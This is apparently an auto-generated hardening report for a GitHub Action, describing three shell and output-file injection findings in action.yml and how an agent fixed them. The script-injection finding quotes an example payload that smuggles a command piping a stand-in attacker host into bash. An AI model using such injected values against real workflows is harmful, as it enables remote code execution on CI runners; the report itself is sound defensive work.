<!-- markdownlint-disable -->

# Hardening Report: freckle--stack-action--generate-matrix/v5.7.32

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **freckle--stack-action--generate-matrix/v5.7.32** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (a) violation: The expression `${{ inputs.find-options }}` is directly interpolated into the `run:` shell command on line 26: `find ${{ inputs.find-options }} -printf "%f"\n | sort -V | jq --slurp`. The Actions runner substitutes this expression before the shell executes the command, so an attacker who controls the `find-options` input can inject arbitrary shell metacharacters and commands (e.g., supplying `-name x; curl attacker.com | bash #`). The value must be passed via an `env:` variable and double-quoted in the shell instead.

Locations:

- `action.yml:26`

### github-env-injection (severity: high)

The `run:` block writes to `$GITHUB_OUTPUT` (line 28) using a heredoc whose content is derived from `find ${{ inputs.find-options }} ...` (line 26). The attacker-controlled `inputs.find-options` value is interpolated directly into the shell command without sanitization, and the resulting `find` output is written to `$GITHUB_OUTPUT` without applying `printf '%s' ... | tr -d '\n\r'`. An attacker can inject newline characters into the output to poison `$GITHUB_OUTPUT` with arbitrary extra key=value pairs, or inject the string `EOM` to terminate the heredoc early and append rogue output lines. Sanitization is required before every write to a special environment file when the source is untrusted.

Locations:

- `action.yml:26`
- `action.yml:28`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.find-options }}" appears directly in run: block of step "Generate"; move to env: map

Locations:

- `action.yml:26`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection, static-inline-injection

**Notes:**

Fixed action.yml step 'Generate': (1) Moved `${{ inputs.find-options }}` from the run: shell command into an env: block as FIND_OPTIONS, referenced unquoted in the shell to preserve word-splitting of the argument list. (2) Replaced the fixed heredoc delimiter 'EOM' with a per-run random delimiter generated from /dev/urandom (`EOF_$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')`), preventing heredoc-termination injection attacks on $GITHUB_OUTPUT.

### Iteration 2

**Fixes applied:** script-injection, github-env-injection

**Notes:**

Fixed both findings in action.yml by replacing the unquoted `find $FIND_OPTIONS` with a properly tokenized bash array. Since `find-options` is a multi-argument list that upstream inlined as a `${{ }}` expression (quote-aware), the xargs-based tokenization approach is used: `printf '%s' "$FIND_OPTIONS" | xargs -r true` (fails fast on unmatched quotes) followed by a while-read loop with `xargs -r printf '%s\0'` to populate `find_args`. The array is then expanded as `find "${find_args[@]}"`. The existing heredoc with random delimiter for `$GITHUB_OUTPUT` was already safe for multi-line values and was preserved.

